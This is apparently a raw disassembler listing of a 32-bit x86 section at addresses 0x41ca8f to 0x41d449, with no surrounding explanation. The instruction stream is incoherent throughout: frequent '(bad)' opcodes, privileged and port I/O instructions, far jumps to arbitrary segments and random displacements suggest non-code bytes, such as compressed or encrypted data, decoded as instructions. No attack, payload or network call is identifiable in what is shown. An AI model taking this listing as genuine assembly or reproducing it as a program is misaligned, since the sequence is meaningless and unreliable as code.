  41ca8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca90:	xchg   al,dh
  41ca92:	push   ecx
  41ca93:	jg     0x41ca90
  41ca95:	popf   
  41ca96:	pop    ecx
  41ca97:	jmp    FWORD PTR [esi+0x219be273]
  41ca9d:	jmp    0x97849ccb
  41caa2:	int    0xbd
  41caa4:	cmp    DWORD PTR [edx-0xc3a8e17],esi
  41caaa:	addr16 cmp edx,ebx
  41caad:	and    DWORD PTR [edx+0x61],ebx
  41cab0:	mov    ch,0x8b
  41cab2:	cwde   
  41cab3:	mov    DWORD PTR [esi-0xaa9eff0],ebx
  41cab9:	inc    ecx
  41caba:	jmp    0x9806b466
  41cabf:	jne    0x41ca55
  41cac1:	aas    
  41cac2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cac4:	inc    edi
  41cac5:	hlt    
  41cac6:	cmp    edx,esi
  41cac8:	cmp    al,0x7e
  41caca:	test   al,0xc0
  41cacc:	cmp    BYTE PTR [edx],0xbf
  41cacf:	pop    es
  41cad0:	or     edx,eax
  41cad2:	stos   DWORD PTR es:[edi],eax
  41cad3:	aaa    
  41cad4:	pushf  
  41cad5:	aam    0x6e
  41cad7:	and    ebx,DWORD PTR [ebp-0x7c]
  41cada:	adc    DWORD PTR [edx+0x52],esp
  41cadd:	setb   BYTE PTR [edi+0x33]
  41cae1:	pop    ss
  41cae2:	bound  edi,QWORD PTR [esi+0x498f6838]
  41cae8:	popf   
  41cae9:	cmp    eax,0x835d8564
  41caee:	inc    BYTE PTR [eax-0x2bf0a686]
  41caf4:	push   ebx
  41caf5:	mov    ecx,0x3f4eb74
  41cafa:	xor    ch,BYTE PTR [ebp-0x1caeb8db]
  41cb00:	(bad)  
  41cb01:	pop    edx
  41cb02:	dec    edi
  41cb03:	ss pop edi
  41cb05:	jne    0x41cb66
  41cb07:	dec    edx
  41cb08:	adc    BYTE PTR [ebp-0x20],dh
  41cb0b:	push   es
  41cb0c:	push   0xd8bea99c
  41cb11:	pop    ecx
  41cb12:	and    al,0x98
  41cb14:	out    dx,eax
  41cb15:	outs   dx,BYTE PTR ds:[esi]
  41cb16:	or     BYTE PTR [ebx+0x7c],cl
  41cb19:	push   eax
  41cb1a:	or     BYTE PTR [ecx-0x32],bl
  41cb1d:	scas   al,BYTE PTR es:[edi]
  41cb1e:	push   edi
  41cb1f:	cmp    eax,0x44e7b106
  41cb24:	test   al,0xd
  41cb26:	test   eax,0x12b20ce7
  41cb2b:	cmpxchg DWORD PTR [ecx+0x3d],esp
  41cb2f:	ret    
  41cb30:	in     eax,0x3a
  41cb32:	retf   
  41cb33:	push   cs
  41cb34:	(bad)  
  41cb35:	out    dx,eax
  41cb36:	inc    esi
  41cb37:	aas    
  41cb38:	out    dx,eax
  41cb39:	mov    eax,0xc6cd14a8
  41cb3e:	push   ss
  41cb3f:	mov    ch,0x52
  41cb41:	sti    
  41cb42:	arpl   WORD PTR [edx+0x54],bp
  41cb45:	or     ecx,DWORD PTR [edx+0x2e]
  41cb48:	mov    eax,0x33bbbcee
  41cb4d:	cvtps2pi mm7,QWORD PTR [ebx-0x582c5c1c]
  41cb54:	das    
  41cb55:	ds pop ecx
  41cb57:	retf   
  41cb58:	cmp    DWORD PTR [esi+edx*1+0x6540c237],esi
  41cb5f:	xchg   esi,eax
  41cb60:	sub    BYTE PTR [edx],dl
  41cb62:	xchg   edx,eax
  41cb63:	mov    esi,0x1ac7ced9
  41cb68:	shl    BYTE PTR [eax-0x40],0x4a
  41cb6c:	int    0x14
  41cb6e:	icebp  
  41cb6f:	fild   WORD PTR [eax+eiz*1]
  41cb73:	(bad)  
  41cb74:	sbb    al,0xae
  41cb76:	mov    BYTE PTR [ecx+0x62919d39],dl
  41cb7c:	or     DWORD PTR [edi+ebp*8],ecx
  41cb7f:	or     ch,BYTE PTR [esp+ebx*8-0x4bad1b44]
  41cb86:	push   ds
  41cb87:	jb     0x41cb32
  41cb89:	cmp    al,BYTE PTR [ebp+0x5488bdbf]
  41cb8f:	cmp    al,0x0
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x81902322
  41cc03:	dec    ecx
  41cc04:	mov    dl,0x31
  41cc06:	add    DWORD PTR [eax],eax
  41cc08:	add    eax,0xca000001
  41cc0d:	inc    esp
  41cc0e:	mov    BYTE PTR [esi-0x58691688],bh
  41cc14:	cmp    eax,DWORD PTR [ecx+0x131ef844]
  41cc1a:	lods   al,BYTE PTR ds:[esi]
  41cc1b:	mov    edx,DWORD PTR [edi-0x7a]
  41cc1e:	(bad)
  41cc21:	rcr    BYTE PTR [esi+edx*4],cl
  41cc24:	lea    edi,[esp+esi*8+0x56]
  41cc28:	push   0xd80e5b01
  41cc2d:	mov    edi,0x203ad294
  41cc32:	sti    
  41cc33:	pop    ecx
  41cc34:	xor    al,0x8c
  41cc36:	mov    ecx,0x649193a
  41cc3b:	jmp    0x41cc19
  41cc3d:	sti    
  41cc3e:	mov    eax,ds:0xcb8b65dd
  41cc43:	mov    ebp,0xfb87b2c5
  41cc48:	adc    DWORD PTR [eax-0x40],eax
  41cc4b:	cs pop esi
  41cc4d:	cmc    
  41cc4e:	mov    al,0x22
  41cc50:	xor    eax,0x5966ada0
  41cc55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc56:	(bad)  
  41cc58:	jne    0x41cc8f
  41cc5a:	jmp    0xd821:0x3c500806
  41cc61:	sub    ebp,0x95fbe835
  41cc67:	mov    al,ds:0x90927e9b
  41cc6c:	out    0x40,eax
  41cc6e:	out    0x8f,eax
  41cc70:	mov    ch,0x3a
  41cc72:	push   ss
  41cc73:	push   eax
  41cc74:	fdiv   QWORD PTR [esp+eiz*4]
  41cc77:	sub    ebx,DWORD PTR [edi+0x215e92e5]
  41cc7d:	jle    0x41cca6
  41cc7f:	dec    edx
  41cc80:	(bad)  
  41cc81:	fidivr DWORD PTR [eax+0x3fe4a108]
  41cc87:	retf   0xb8d
  41cc8a:	xlat   BYTE PTR ds:[ebx]
  41cc8b:	add    DWORD PTR [ecx],edi
  41cc8d:	jne    0x41cccb
  41cc8f:	push   ecx
  41cc90:	pop    esi
  41cc91:	cmc    
  41cc92:	sub    eax,0x22ea81c9
  41cc97:	pop    ebp
  41cc98:	mov    bl,0xbc
  41cc9a:	loop   0x41cc66
  41cc9c:	xlat   BYTE PTR ds:[ebx]
  41cc9d:	xchg   esp,eax
  41cc9e:	add    ebp,DWORD PTR [ebx+0x7d]
  41cca1:	sbb    al,0x23
  41cca3:	jg     0x41ccc1
  41cca5:	sbb    al,dl
  41cca7:	cmp    ah,BYTE PTR [eax+eax*4]
  41ccaa:	adc    eax,0x55270877
  41ccaf:	outs   dx,DWORD PTR ds:[esi]
  41ccb0:	sbb    bh,BYTE PTR [eax-0x59]
  41ccb3:	sub    dl,dh
  41ccb5:	inc    edi
  41ccb6:	ss sahf 
  41ccb8:	xor    BYTE PTR [ebp+0x28],dl
  41ccbb:	daa    
  41ccbc:	outs   dx,BYTE PTR ds:[esi]
  41ccbd:	ss or  eax,edi
  41ccc0:	outs   dx,BYTE PTR ds:[esi]
  41ccc1:	dec    esi
  41ccc2:	ja     0x41ccb1
  41ccc4:	mov    bl,0x9c
  41ccc6:	sub    DWORD PTR [edx],edx
  41ccc8:	ret    0x92a8
  41cccb:	push   ebp
  41cccc:	xor    ecx,ebx
  41ccce:	out    0x99,al
  41ccd0:	mov    ds:0x2a9c93ea,eax
  41ccd5:	scas   eax,DWORD PTR es:[edi]
  41ccd6:	or     bl,BYTE PTR [eax-0x75cb706d]
  41ccdc:	pop    ebx
  41ccdd:	das    
  41ccde:	or     eax,0x4685ee94
  41cce3:	clc    
  41cce4:	or     al,0xae
  41cce6:	push   edi
  41cce7:	loope  0x41cd2f
  41cce9:	es cs pushf 
  41ccec:	daa    
  41cced:	cli    
  41ccee:	sbb    eax,0x7151b351
  41ccf3:	jg     0x41cca6
  41ccf5:	clc    
  41ccf6:	pushf  
  41ccf7:	pop    esp
  41ccf8:	fdivr  QWORD PTR [ebp+0x1098c64b]
  41ccfe:	iret   
  41ccff:	or     eax,0x2fcb2038
  41cd04:	mov    ebp,0xd37ae289
  41cd09:	dec    esp
  41cd0a:	or     DWORD PTR [edi-0x6ba201ae],0x1d
	...
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	aam    0x50
  41cd82:	jae    0x41cd09
  41cd84:	mov    bh,0x32
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    eax,0x7f000001
  41cd8d:	(bad)
  41cd91:	adc    eax,0xadacfb48
  41cd96:	mov    al,ds:0xda3673fe
  41cd9b:	sti    
  41cd9c:	dec    esp
  41cd9d:	xchg   esp,eax
  41cd9e:	xchg   esi,eax
  41cd9f:	test   BYTE PTR [ebx+edi*1],dl
  41cda2:	cli    
  41cda3:	repz cmovno ebp,edi
  41cda7:	nop
  41cda8:	push   ss
  41cda9:	leave  
  41cdaa:	add    DWORD PTR [esp+eiz*4],ecx
  41cdad:	fwait
  41cdae:	xor    al,0xb7
  41cdb0:	sbb    eax,0xf934b326
  41cdb5:	inc    ebp
  41cdb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb7:	and    al,0xc7
  41cdb9:	xchg   edi,eax
  41cdba:	mov    fs,esp
  41cdbc:	xor    dh,dh
  41cdbe:	shr    DWORD PTR [edx-0x40],0x22
  41cdc2:	aam    0xee
  41cdc4:	push   ecx
  41cdc5:	rcr    BYTE PTR [esi-0x4a],cl
  41cdc8:	adc    DWORD PTR [esi+0x14],0xf103c4b4
  41cdcf:	inc    ebp
  41cdd0:	mov    fs,WORD PTR [edx-0x3c]
  41cdd3:	loopne 0x41cdfa
  41cdd5:	jae    0x41cdba
  41cdd7:	call   FWORD PTR [ebp+0x62]
  41cdda:	or     eax,0xeb723751
  41cddf:	ja     0x41ce2e
  41cde1:	shl    DWORD PTR [ebx+0x3c625d25],cl
  41cde7:	imul   BYTE PTR [esi+0x34]
  41cdea:	xchg   DWORD PTR [ebx+edi*1-0x4],ebx
  41cdee:	mov    ecx,0x76978e4
  41cdf3:	mov    ch,0x9
  41cdf5:	stos   BYTE PTR es:[edi],al
  41cdf6:	xchg   ebx,eax
  41cdf7:	and    al,0xf2
  41cdf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdfa:	jae    0x41ce51
  41cdfc:	iret   
  41cdfd:	inc    ebx
  41cdfe:	jg     0x41cdf3
  41ce00:	lock (bad) 
  41ce02:	int3   
  41ce03:	push   ss
  41ce04:	ins    DWORD PTR es:[edi],dx
  41ce05:	mov    ebx,DWORD PTR ds:0x757d61fc
  41ce0b:	repnz adc al,BYTE PTR [ebx+0x6]
  41ce0f:	icebp  
  41ce10:	dec    ebp
  41ce11:	mov    dl,0xcc
  41ce13:	lods   eax,DWORD PTR ds:[esi]
  41ce14:	xor    DWORD PTR [eax+eax*8],ecx
  41ce17:	aad    0x2e
  41ce19:	int    0x55
  41ce1b:	stos   BYTE PTR es:[edi],al
  41ce1c:	sub    al,dl
  41ce1e:	mov    al,ds:0x38174c0d
  41ce23:	int3   
  41ce24:	xor    BYTE PTR [eax-0x29f9abe0],ch
  41ce2a:	pop    edi
  41ce2b:	sbb    BYTE PTR ds:0x119d7f7c,ah
  41ce31:	in     eax,dx
  41ce32:	mov    ecx,0x5fa238b7
  41ce37:	jp     0x41ce00
  41ce39:	nop
  41ce3a:	or     ebp,esi
  41ce3c:	push   esp
  41ce3d:	jb     0x41ceb5
  41ce3f:	test   DWORD PTR [ebp+0x1cb5ec07],ebp
  41ce45:	imul   edi,DWORD PTR [edi],0x59
  41ce48:	dec    eax
  41ce49:	(bad)  [eax]
  41ce4b:	call   0xd400:0xf888b1e1
  41ce52:	in     eax,0x29
  41ce54:	mov    bl,BYTE PTR [eax+ebx*1]
  41ce57:	aad    0x9e
  41ce59:	imul   ebx,DWORD PTR [edx-0x2d9dddd1],0xffffff98
  41ce60:	aaa    
  41ce61:	dec    ecx
  41ce62:	mov    ecx,DWORD PTR [ebp+0x49629c63]
  41ce68:	mov    ebx,0x9e32584d
  41ce6d:	in     eax,0x6a
  41ce6f:	gs test al,0xab
  41ce72:	xchg   DWORD PTR [edi],esi
  41ce74:	or     esp,DWORD PTR [esp+ebx*4+0x15]
  41ce78:	push   ebx
  41ce79:	fmul   DWORD PTR [esi+edx*4]
  41ce7c:	repz les eax,FWORD PTR ds:0x4aead1c7
  41ce84:	in     al,0x36
  41ce86:	fdiv   DWORD PTR [ebp*8-0x5c8e391d]
  41ce8d:	stos   BYTE PTR es:[edi],al
  41ce8e:	pop    edx
  41ce8f:	jns    0x41cef7
	...
  41cef1:	add    BYTE PTR [eax],al
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	xchg   edx,eax
  41cf01:	pusha  
  41cf02:	mov    ebp,0x133bc9a
  41cf07:	add    BYTE PTR ds:0x27000001,al
  41cf0d:	push   0x7d938ee9
  41cf12:	pop    es
  41cf13:	sbb    eax,0x805c1d6
  41cf18:	adc    DWORD PTR [edi+0x29],ebx
  41cf1b:	mov    ebp,0xaecccd21
  41cf20:	jp     0x41cf62
  41cf22:	adc    DWORD PTR [edi],eax
  41cf24:	mov    dl,0x57
  41cf26:	dec    ebx
  41cf27:	out    0x1d,al
  41cf29:	sti    
  41cf2a:	sti    
  41cf2b:	inc    ecx
  41cf2c:	cdq    
  41cf2d:	sti    
  41cf2e:	and    edi,DWORD PTR [eax]
  41cf30:	imul   edx,ecx,0x617d5616
  41cf36:	jp     0x41cef1
  41cf38:	aaa    
  41cf39:	jb     0x41cfb8
  41cf3b:	pop    edx
  41cf3c:	push   ss
  41cf3d:	sbb    cl,dl
  41cf3f:	mov    dl,0xb7
  41cf41:	dec    ch
  41cf43:	icebp  
  41cf44:	cmp    eax,0xcdcb18b3
  41cf49:	mov    bl,0x3c
  41cf4b:	loop   0x41ceff
  41cf4d:	push   edi
  41cf4e:	ja     0x41cf1b
  41cf50:	mov    ds,edi
  41cf52:	mov    al,ds:0x122ffba1
  41cf57:	push   ds
  41cf58:	add    DWORD PTR [ebx+0x32],edi
  41cf5b:	xchg   edi,edi
  41cf5d:	out    dx,eax
  41cf5e:	sbb    ch,dh
  41cf60:	add    DWORD PTR [ecx+esi*2-0x2cc9b59f],ebx
  41cf67:	in     eax,0x43
  41cf69:	mov    al,0x16
  41cf6b:	mov    cl,0x6e
  41cf6d:	pop    ecx
  41cf6e:	xor    edx,ecx
  41cf70:	in     al,0x53
  41cf72:	(bad)  
  41cf73:	push   ebp
  41cf74:	(bad)  
  41cf75:	and    DWORD PTR [eax-0x10],esp
  41cf78:	leave  
  41cf79:	popa   
  41cf7a:	out    dx,eax
  41cf7b:	or     ah,BYTE PTR ds:0xb5c18d97
  41cf81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf82:	dec    ecx
  41cf83:	mov    edx,DWORD PTR [eax+0x43]
  41cf86:	cmp    DWORD PTR [ecx],0x17
  41cf89:	add    bl,al
  41cf8b:	jp     0x41cf78
  41cf8d:	adc    esp,DWORD PTR [ebx+0x6057ac19]
  41cf93:	xchg   edx,eax
  41cf94:	out    dx,al
  41cf95:	push   esp
  41cf96:	xchg   DWORD PTR [esi],ecx
  41cf98:	retf   
  41cf99:	in     al,dx
  41cf9a:	dec    edx
  41cf9b:	cmp    ch,BYTE PTR cs:0x7800ede1
  41cfa2:	out    0x9d,eax
  41cfa4:	imul   edx,DWORD PTR [ebx],0x0
  41cfa7:	jns    0x41cfd4
  41cfa9:	sub    cx,WORD PTR [edi+ebx*8-0x6c023c4d]
  41cfb1:	push   esp
  41cfb2:	and    ah,BYTE PTR [ebx]
  41cfb4:	push   cs
  41cfb5:	mov    ebx,0x87684714
  41cfba:	sbb    al,ch
  41cfbc:	xchg   edi,eax
  41cfbd:	and    eax,0xf60a8ccc
  41cfc2:	or     BYTE PTR [edx+0x23],cl
  41cfc5:	cmp    ch,BYTE PTR [edi]
  41cfc7:	jl     0x41cfc4
  41cfc9:	data16 or al,dl
  41cfcc:	cld    
  41cfcd:	dec    ecx
  41cfce:	inc    eax
  41cfcf:	stc    
  41cfd0:	sbb    bl,BYTE PTR [ebp-0x79]
  41cfd3:	mov    edx,0x190d1303
  41cfd8:	test   DWORD PTR ds:0xad3293a7,eax
  41cfde:	mov    edx,fs
  41cfe0:	mov    esi,0xdd5ffea0
  41cfe5:	(bad)  
  41cfe6:	int3   
  41cfe7:	stos   DWORD PTR es:[edi],eax
  41cfe8:	or     DWORD PTR [ecx-0x47],0xffffffd1
  41cfec:	sbb    edx,ecx
  41cfee:	sbb    BYTE PTR [edi+0x5c5d08f5],bl
  41cff4:	pop    es
  41cff5:	out    0xec,al
  41cff7:	xor    esp,eax
  41cff9:	(bad)  
  41cffa:	sbb    al,0xd2
  41cffc:	es fs rep lock ins DWORD PTR es:[edi],dx
  41d001:	dec    esi
  41d002:	sbb    al,0x96
  41d004:	add    eax,0x410fa442
  41d009:	dec    ecx
  41d00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d00b:	lock xor BYTE PTR [ecx],al
  41d00e:	cmp    BYTE PTR ds:0x9e,bh
	...
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xbbfeafbd
  41d083:	or     eax,ecx
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR ds:0xcc000001,al
  41d08d:	call   0xe605:0x9f2b3505
  41d094:	add    esi,DWORD PTR [ebx+0x4048b74e]
  41d09a:	adc    BYTE PTR [ebx],bl
  41d09c:	jno    0x41d0ca
  41d09e:	mov    al,ds:0x6b531d21
  41d0a3:	xor    eax,0x27ac4aab
  41d0a8:	cdq    
  41d0a9:	push   ds
  41d0aa:	xchg   DWORD PTR [ebx-0x31],edi
  41d0ad:	mov    BYTE PTR [edx-0x7e9ed973],0xb0
  41d0b4:	(bad)  
  41d0b5:	xlat   BYTE PTR ds:[ebx]
  41d0b6:	cmc    
  41d0b7:	inc    ecx
  41d0b8:	inc    ebx
  41d0b9:	cwde   
  41d0ba:	or     al,0xc6
  41d0bc:	fld    QWORD PTR [ebx+0x26770e22]
  41d0c2:	icebp  
  41d0c3:	sti    
  41d0c4:	xchg   esp,eax
  41d0c5:	loop   0x41d096
  41d0c7:	out    dx,eax
  41d0c8:	aad    0x7a
  41d0ca:	das    
  41d0cb:	add    DWORD PTR [edi-0x61c7622f],edi
  41d0d1:	mov    edi,DWORD PTR [esi]
  41d0d3:	pop    es
  41d0d4:	sbb    eax,0x3e396193
  41d0d9:	into   
  41d0da:	push   ecx
  41d0db:	fiadd  DWORD PTR [esi]
  41d0dd:	ja     0x41d148
  41d0df:	out    0x9d,al
  41d0e1:	mov    al,0x57
  41d0e3:	pop    esp
  41d0e4:	push   ds
  41d0e5:	dec    ebx
  41d0e6:	jb     0x41d0f3
  41d0e8:	jns    0x41d11b
  41d0ea:	push   edi
  41d0eb:	mov    dh,0xef
  41d0ed:	push   ecx
  41d0ee:	sub    DWORD PTR [ebx+eax*2],0x322d625
  41d0f5:	xchg   edx,eax
  41d0f6:	das    
  41d0f7:	cmp    eax,0xaa3714cd
  41d0fc:	jnp    0x41d123
  41d0fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0ff:	mov    dl,0xd7
  41d101:	lock clc 
  41d103:	pop    edi
  41d104:	into   
  41d105:	aad    0x1a
  41d107:	out    0x88,al
  41d109:	and    ebx,DWORD PTR es:[ebx]
  41d10c:	sub    cl,BYTE PTR [esp+eiz*4]
  41d10f:	mov    ah,0x42
  41d111:	js     0x41d144
  41d113:	fdivr  QWORD PTR [edi]
  41d115:	fld    st(4)
  41d117:	xlat   BYTE PTR ds:[ebx]
  41d118:	aas    
  41d119:	pop    edx
  41d11a:	add    esi,eax
  41d11c:	imul   ebp,DWORD PTR [eax-0x26],0xd093cadf
  41d123:	test   eax,0xbc3d9ff4
  41d128:	jae    0x41d197
  41d12a:	add    ebp,esi
  41d12c:	lods   eax,DWORD PTR ds:[esi]
  41d12d:	inc    eax
  41d12e:	mov    bl,0xd1
  41d130:	in     eax,0xfd
  41d132:	out    0x39,eax
  41d134:	rcl    DWORD PTR [edi+0x2],1
  41d137:	lea    esi,ds:0x3c9463ac
  41d13d:	out    dx,eax
  41d13e:	aaa    
  41d13f:	sbb    al,ah
  41d141:	cs js  0x41d180
  41d144:	cs int 0x2b
  41d147:	dec    ebp
  41d148:	jp     0x41d111
  41d14a:	das    
  41d14b:	mov    ebp,0x9b1f7c48
  41d150:	xor    BYTE PTR [edi],bl
  41d152:	sar    BYTE PTR [esp+ecx*8+0x72404fdc],0xa0
  41d15a:	shl    DWORD PTR [edx-0x52],1
  41d15d:	sub    bh,BYTE PTR [edx+0x36]
  41d160:	pop    ds
  41d161:	call   0xdeeafeb6
  41d166:	xchg   esp,eax
  41d167:	cmc    
  41d168:	dec    ecx
  41d169:	mov    edi,0xa17d5a1f
  41d16e:	mov    dh,0x29
  41d170:	icebp  
  41d171:	cmp    eax,0xa32fef44
  41d176:	shl    DWORD PTR [eax+edx*1-0x5a9b220e],cl
  41d17d:	mov    al,0x5e
  41d17f:	sbb    DWORD PTR [ebx],0x21f30546
  41d185:	push   esi
  41d186:	retf   
  41d187:	outs   dx,DWORD PTR ds:[esi]
  41d188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d189:	sub    DWORD PTR [edx],esi
  41d18b:	sbb    al,0xc9
  41d18d:	pusha  
  41d18e:	icebp  
  41d18f:	cmp    al,0x74
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	inc    ecx
  41d201:	xor    DWORD PTR [eax+0x4c],0x135c6
  41d208:	add    eax,0x3000001
  41d20d:	xchg   ebx,eax
  41d20e:	sbb    ebx,DWORD PTR [edx+0x71]
  41d211:	(bad)  
  41d212:	loope  0x41d199
  41d214:	(bad)  
  41d215:	test   ebp,edx
  41d217:	iret   
  41d218:	nop
  41d219:	inc    esp
  41d21a:	mov    ah,0xc0
  41d21c:	rcr    DWORD PTR [ecx+ecx*4-0x69],0x1e
  41d221:	adc    al,0x4d
  41d223:	mov    ah,0x8e
  41d225:	mov    ah,0xa3
  41d227:	jl     0x41d25d
  41d229:	mov    edx,0x6436ffbd
  41d22e:	add    BYTE PTR [ebx+0x65],ah
  41d231:	or     DWORD PTR [eax],0x75ad94bc
  41d237:	(bad)  [edx]
  41d239:	ret    0x3da0
  41d23c:	xor    ebp,DWORD PTR [edx]
  41d23e:	mov    ecx,0xc443a856
  41d243:	xchg   BYTE PTR [eax+0x2c],bh
  41d246:	or     al,0x9e
  41d248:	push   edi
  41d249:	push   es
  41d24a:	xor    BYTE PTR [eax-0x71c699e0],cl
  41d250:	add    esp,DWORD PTR [ecx]
  41d252:	popa   
  41d253:	inc    esp
  41d254:	not    edi
  41d256:	dec    edi
  41d257:	xor    ecx,DWORD PTR [edx+0x70]
  41d25a:	mov    esp,0x6db3df7a
  41d25f:	rol    BYTE PTR [edx-0xaa5d238],1
  41d265:	jns    0x41d265
  41d267:	xchg   BYTE PTR [esi-0x9],al
  41d26a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d26b:	shl    DWORD PTR [edi-0x34d387fb],0x62
  41d272:	and    DWORD PTR [bx],esp
  41d275:	aam    0x69
  41d277:	mov    ds:0x82a8f9c9,al
  41d27c:	lea    esp,[ecx]
  41d27e:	push   esi
  41d27f:	sbb    eax,0xd95db9d9
  41d284:	cmp    ebx,0xffffff8b
  41d287:	loop   0x41d271
  41d289:	loope  0x41d299
  41d28b:	push   ebx
  41d28c:	sbb    WORD PTR [ebp+0x4df297a0],sp
  41d293:	test   al,0x32
  41d295:	cmp    ah,BYTE PTR [ecx+0x2a]
  41d298:	and    bl,BYTE PTR [esi-0x10]
  41d29b:	rcr    BYTE PTR [eax],0xe9
  41d29e:	je     0x41d30b
  41d2a0:	fcom   QWORD PTR [eax+edx*8+0x8]
  41d2a4:	inc    edi
  41d2a5:	mov    eax,ds:0x69cd3bf1
  41d2aa:	jecxz  0x41d29d
  41d2ac:	ins    DWORD PTR es:[edi],dx
  41d2ad:	pushf  
  41d2ae:	scas   al,BYTE PTR es:[edi]
  41d2af:	add    al,0x77
  41d2b1:	or     eax,DWORD PTR [ebp+0x29]
  41d2b4:	and    ebp,ecx
  41d2b6:	add    dl,BYTE PTR [esi*8-0x38f6970]
  41d2bd:	out    dx,eax
  41d2be:	push   esi
  41d2bf:	mov    dh,0xb3
  41d2c1:	push   ss
  41d2c2:	pop    es
  41d2c3:	cmp    DWORD PTR [edi-0x3],ebp
  41d2c6:	lods   al,BYTE PTR ds:[esi]
  41d2c7:	(bad)
  41d2ca:	outs   dx,BYTE PTR ds:[esi]
  41d2cb:	das    
  41d2cc:	(bad)  
  41d2cd:	adc    al,0xb8
  41d2cf:	xor    cl,ch
  41d2d1:	xor    dl,dh
  41d2d3:	adc    BYTE PTR [ebx+0x52],0xff
  41d2d7:	retf   0x4e6e
  41d2da:	fmul   DWORD PTR [esi]
  41d2dc:	mov    edx,0x996299a4
  41d2e1:	sbb    DWORD PTR [ebp-0x2f29e70],ecx
  41d2e7:	fwait
  41d2e8:	mov    eax,0xada3daf7
  41d2ed:	ds retf 
  41d2ef:	pop    ds
  41d2f0:	mov    edx,0x60f705fb
  41d2f5:	out    dx,al
  41d2f6:	cmp    DWORD PTR [eax+eax*4+0xe],esp
  41d2fa:	mov    ebp,0xdb1dd9c4
  41d2ff:	(bad)  
  41d300:	mov    eax,0x6083e24e
  41d305:	repz jnp 0x41d363
  41d308:	loope  0x41d320
  41d30a:	mov    ss:0x7e2c7197,eax
  41d310:	adc    BYTE PTR [eax],al
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	or     DWORD PTR [edi+0x4],edi
  41d383:	xlat   BYTE PTR ds:[ebx]
  41d384:	retf   
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0xad000001
  41d38d:	ds and eax,0xc6443a0c
  41d393:	inc    edi
  41d394:	jle    0x41d336
  41d396:	mov    ebp,0x9a8a277b
  41d39b:	pop    esp
  41d39c:	sahf   
  41d39d:	mov    esp,0xa960fadc
  41d3a2:	in     al,0x81
  41d3a4:	xchg   ebx,eax
  41d3a5:	in     al,dx
  41d3a6:	push   ds
  41d3a7:	mov    edx,0xe7b965df
  41d3ac:	shl    BYTE PTR [edi],1
  41d3ae:	(bad)  
  41d3af:	shl    DWORD PTR [eax],0xae
  41d3b2:	in     eax,0xf6
  41d3b4:	push   0xffffffdb
  41d3b6:	cmp    esp,DWORD PTR [ecx+ebp*8-0x5bbc069f]
  41d3bd:	mov    ebx,0xee599380
  41d3c2:	jmp    0x7abf:0x421725f5
  41d3c9:	xor    al,0x50
  41d3cb:	mov    al,0x7d
  41d3cd:	retf   
  41d3ce:	dec    esi
  41d3cf:	adc    eax,0x6f3299a
  41d3d4:	dec    esp
  41d3d5:	in     eax,0x53
  41d3d7:	shl    DWORD PTR [edx+edi*1-0x7bb5bc9b],cl
  41d3de:	fisub  DWORD PTR [ebp+edi*1+0x7c]
  41d3e2:	adc    al,0xe0
  41d3e4:	repz idiv BYTE PTR [edx-0x2d]
  41d3e8:	in     al,0x2
  41d3ea:	cmp    esp,ecx
  41d3ec:	fwait
  41d3ed:	dec    ecx
  41d3ee:	xor    dl,al
  41d3f0:	add    ch,BYTE PTR [ebp-0x58]
  41d3f3:	loope  0x41d3f7
  41d3f5:	(bad)  
  41d3f6:	ds push ds
  41d3f8:	mov    esi,0x70dc2a28
  41d3fd:	add    al,0x2
  41d3ff:	jmp    FWORD PTR [edx]
  41d401:	add    ah,BYTE PTR [edi-0x79]
  41d404:	repnz xchg ebx,eax
  41d406:	int    0x4c
  41d408:	jp     0x41d436
  41d40a:	inc    esp
  41d40b:	hlt    
  41d40c:	push   esp
  41d40d:	cmp    DWORD PTR [ebx+0x1f1f4d72],0x5033d684
  41d417:	cs dec ebx
  41d419:	ss sub al,0x60
  41d41c:	leave  
  41d41d:	sub    DWORD PTR [edx+0x1d6acf81],0x5a
  41d424:	int    0x7d
  41d426:	gs (bad) 
  41d429:	stc    
  41d42a:	es mov ebp,0x14df1929
  41d430:	and    bh,BYTE PTR [ebp+0x2b7998c3]
  41d436:	and    eax,eax
  41d438:	cli    
  41d439:	lock data16 loope 0x41d3da
  41d43d:	loopne 0x41d453
  41d43f:	not    DWORD PTR [eax+0x47cd28cd]
  41d445:	(bad)  
  41d446:	xor    ebx,ebx
  41d448:	push   esp
  41d449:	scas   al,BYTE PTR es:[edi]
